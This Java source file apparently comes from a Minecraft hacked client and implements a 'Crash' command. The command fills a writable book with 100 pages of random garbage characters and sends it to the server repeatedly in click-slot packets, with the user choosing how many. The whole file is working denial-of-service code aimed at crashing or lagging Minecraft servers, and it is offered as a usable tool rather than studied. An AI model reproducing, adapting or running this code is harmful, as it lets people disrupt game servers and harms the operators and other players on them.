package me.constantindev.ccl.features.command.impl;

import me.constantindev.ccl.Cornos;
import me.constantindev.ccl.etc.helper.STL;
import me.constantindev.ccl.features.command.Command;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.ListTag;
import net.minecraft.nbt.StringTag;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.screen.slot.SlotActionType;

import java.util.Objects;
import java.util.Random;

public class Crash extends Command {

    public Crash() {
        super("Crash", "when the (This does not work on many servers)", new String[]{"crash", "break"});
    }

    @Override
    public void onExecute(String[] args) {
        if (args.length == 0) {
            STL.notifyUser("Could you like provide the amount of packets to send? (~ 40 is pog)");
            return;
        }
        int amount;
        try {
            amount = Integer.parseInt(args[0]);
        } catch (Exception ignored) {
            STL.notifyUser("Im not sure if " + args[0] + " a number");
            return;
        }
        ItemStack stack = new ItemStack(Items.WRITABLE_BOOK);
        CompoundTag tag = stack.getOrCreateTag();
        ListTag list = new ListTag();
        for (int i = 0; i < 100; i++) {
            StringTag st = StringTag.of(createGarbageData(600, 0, 1000));
            list.add(st);
        }
        assert Cornos.minecraft.player != null;
        tag.put("author", StringTag.of(Cornos.minecraft.player.getEntityName()));
        tag.put("title", StringTag.of("\n the server \n needs \n a schmoke \n"));
        tag.put("pages", list);
        stack.setTag(tag);
        for (int i = 0; i < amount; i++) {
            //Objects.requireNonNull(Cornos.minecraft.getNetworkHandler()).sendPacket(new CreativeInventoryActionC2SPacket(0, stack));
            Objects.requireNonNull(Cornos.minecraft.getNetworkHandler()).sendPacket(new ClickSlotC2SPacket(0, 0, 0, SlotActionType.PICKUP, stack, (short) 0));
        }
        super.onExecute(args);
    }

    private String createGarbageData(int size, int boundMin, int boundMax) {
        StringBuilder ret = new StringBuilder();
        Random r = new Random();
        for (int i = 0; i < size; i++) {
            char c;
            int cI = r.nextInt(boundMax - boundMin) + boundMin;
            c = (char) cI;
            ret.append(c);
        }
        return ret.toString();
    }
}
